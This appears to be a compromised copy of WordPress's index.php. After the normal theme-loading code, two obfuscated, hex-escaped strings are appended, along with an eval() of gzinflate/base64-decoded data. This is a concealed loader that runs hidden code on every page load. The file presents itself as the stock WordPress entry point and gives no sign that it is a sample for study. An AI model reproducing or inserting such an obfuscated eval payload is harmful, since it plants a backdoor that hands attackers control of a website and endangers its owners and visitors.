<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dgt\x41F2JomjhV6rM3FXxr0ju/wGtHHllvjYfpe1DRgGMv6ZDo6Ep1qF8g\x61939nSkX/\x42I\x62mmyQ2Q\x2bM\x610JeOWye0QXI\x63NILP3\x42qYojE9/\x62\x62J97v\x43sdOE6\x41o\x41OQg\x63K1JGr0wmVJw\x2bKw\x41w\x41ID7QMJ3y/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
